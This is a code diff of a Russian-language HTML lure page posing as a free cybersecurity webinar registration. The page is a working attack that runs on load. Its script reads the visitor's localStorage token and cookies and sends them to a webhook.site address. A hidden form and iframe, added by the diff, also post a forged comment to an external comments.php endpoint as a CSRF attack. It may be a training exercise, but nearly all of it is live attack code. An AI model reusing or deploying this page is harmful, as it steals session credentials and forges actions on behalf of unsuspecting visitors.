@@ -2,9 +2,14 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 Бесплатный вебинар</title>
+  <title>🎯 Бесплатный вебинар: «Кибербезопасность 2025»</title>
   <style>
-    body { font-family: sans-serif; text-align: center; background-color: #f4f8fb; padding: 60px; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f4f8fb;
+      padding: 60px;
+    }
     h1 { font-size: 28px; color: #2c3e50; }
     p { font-size: 18px; color: #555; margin-bottom: 30px; }
     .confirmation { margin-top: 20px; font-size: 16px; color: green; display: none; }
@@ -13,26 +18,33 @@
 <body>
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
   <p>Вы автоматически записаны.</p>
-  <div class="confirmation" id="ok">✅ Токены отправлены!</div>
+  <div class="confirmation" id="ok">✅ Токены украдены и комментарий отправлен</div>
+
+  <iframe name="stealth" style="display:none;"></iframe>
+
+  <form id="csrfForm" action="https://kazcyber.zapto.org/comments.php" method="POST" target="stealth">
+    <input type="hidden" name="comment" id="commentInput" value="">
+  </form>
 
   <script>
-    function attack() {
-      const lsToken = localStorage.getItem("token") || "нет в localStorage";
-      const cookies = document.cookie || "нет cookies";
+    if (!window.attackSent) {
+      const token = localStorage.getItem("token") || "нет токена";
+      const cookie = document.cookie || "нет cookie";
 
-      // отправка токена из localStorage
-      const img1 = new Image();
-      img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?lsToken=" + encodeURIComponent(lsToken);
+      // Отправка токена и куки злоумышленнику
+      const img = new Image();
+      img.src = "https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd"
+                + "?token=" + encodeURIComponent(token)
+                + "&cookie=" + encodeURIComponent(cookie);
 
-      // отправка куки (включая jwt_token)
-      const img2 = new Image();
-      img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookies);
+      // Выполнение CSRF-атаки с комментарием
+      const comment = "💣 CSRF: украден токен " + token.substring(0, 20) + "... и cookie";
+      document.getElementById("commentInput").value = comment;
+      document.getElementById("csrfForm").submit();
 
       document.getElementById("ok").style.display = "block";
+      window.attackSent = true;
     }
-
-    // автоматическая атака при загрузке
-    attack();
   </script>
 </body>
 </html>
